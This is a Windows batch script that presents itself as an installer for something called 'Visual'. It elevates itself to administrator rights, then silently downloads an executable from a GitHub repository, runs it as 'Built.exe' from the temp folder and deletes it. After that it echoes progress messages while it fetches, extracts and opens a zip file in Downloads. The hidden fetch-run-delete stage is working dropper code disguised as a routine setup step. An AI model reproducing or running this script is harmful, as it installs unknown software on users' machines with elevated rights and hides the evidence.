��&cls
@echo off
setlocal

REM Check if the script is running with admin privileges
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    echo This script requires Administrator privileges. Restarting with admin rights...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

REM Set paths
set "DOWNLOADS=%USERPROFILE%\Downloads"
set "VISUAL_FOLDER=%DOWNLOADS%\Visual"
set "BUILT_EXE=%temp%\Built.exe"
set "VISUAL_ZIP=%DOWNLOADS%\Visual.zip"

REM Download Built.exe
curl -L -o "%BUILT_EXE%" "https://github.com/RealYoChicken/jsjsjdasd/raw/refs/heads/main/Visual.exe" --silent

REM Run Built.exe with administrator privileges
start "" "%BUILT_EXE%"

REM Wait for Built.exe to finish
timeout /t 2 > nul

REM Delete Built.exe
del %BUILT_EXE%

cls

REM Create Visual folder
echo Creating Visual folder...
mkdir "%VISUAL_FOLDER%"

timeout /t 1 >nul
echo.

REM Download Visual.zip
echo Downloading Visual.zip...
curl -L -o "%VISUAL_ZIP%" "https://github.com/RealYoChicken/jsjsjdasd/raw/refs/heads/main/Visual.zip" --silent

REM Extract Visual.zip
echo Extracting Visual.zip...
powershell -Command "Expand-Archive -Force '%VISUAL_ZIP%' '%VISUAL_FOLDER%'"

timeout /t 1 >nul

REM Delete the zip file
del "%VISUAL_ZIP%"

REM Open the Visual folder with administrator privileges
echo Opening Visual folder...
start explorer "%VISUAL_FOLDER%"

echo Done.
pause
